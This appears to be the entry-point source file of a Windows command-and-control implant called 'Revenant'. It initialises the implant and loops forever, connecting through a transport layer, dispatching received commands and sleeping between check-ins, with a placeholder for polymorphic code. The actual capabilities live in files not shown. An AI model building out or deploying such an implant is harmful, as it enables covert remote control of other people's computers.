#pragma clang diagnostic push
#pragma ide diagnostic ignored "EndlessLoop"

#include "Poly.h"
#include "Revenant.h"
#include "Core.h"
#include "Transport.h"
#include "Command.h"

INSTANCE Instance = { 0 };

INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd ) {
    $$$
    RvntInit();

    do {
        if (!Instance.Session.Connected) {
            if(TransportInit()) {
                CommandDispatcher();
            }

        }

        Sleep( Instance.Config.Sleeping * 1000 );

    } while ( TRUE );
}

#pragma clang diagnostic pop